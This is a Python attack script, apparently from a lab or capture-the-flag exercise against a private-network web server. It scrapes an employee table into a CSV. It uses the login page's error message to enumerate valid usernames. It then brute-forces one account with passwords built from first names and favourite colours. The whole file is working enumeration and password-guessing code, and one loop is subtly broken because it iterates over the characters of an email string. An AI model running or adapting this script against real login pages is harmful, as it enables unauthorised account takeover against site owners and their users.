#!/usr/bin/python3

import requests as req
import urllib
import pandas as pd
from itertools import permutations

url = 'http://192.168.169.68:8080/about.html'
urlLogin = 'http://192.168.169.68:8080/login-3/'
csvOutput = 'employee.csv'

tables = pd.read_html(url)
tables[0].to_csv(csvOutput)

df = pd.read_csv(csvOutput)
headers = df.columns.values.tolist()
emails = df['Email'].tolist()
firstName = df['First Name'].tolist()
lastName = df['Last Name'].tolist()
favoriteColor = df['Favorite Color'].tolist()

print ("Headers: " + str(headers))
print ("Emails: " + str(emails))
print ("First Names: " + str(firstName))
print ("Last Names: " + str(lastName))
print ("Colors: " + str(favoriteColor))

for email in emails:
	data = {'username': email, 'password': 'Test'}
	post = req.post(urlLogin, data = data)
	for line in post.iter_lines():
		if "b'[ERROR] Password Invalid for User.'" in str(line):
			print ("Found Line with error for Password: " + str(line) + "\nAssociated email address: " + email)
			mask = df['Email'] == email
			new_df = pd.DataFrame(df[mask])
			print ("Complete CSV Line: " + str(new_df))


email1 = 'dvaliant@bedlamdynamics.com'
passwordlist = []
list1 = firstName
list2 = df['Favorite Color'].str.title()

for email in email1:
	for name in list1:
		for color in list2:
			urllogin = 'http://192.168.169.68:8080/login-3/'
			guess = (''.join((name,color,name,color)))
			print('Attempting Password: ', guess)
			login = {"username":email1,"password": guess}
			loginpageData = req.post(urllogin, data=login)
			loginContent = loginpageData.content
			print(loginContent)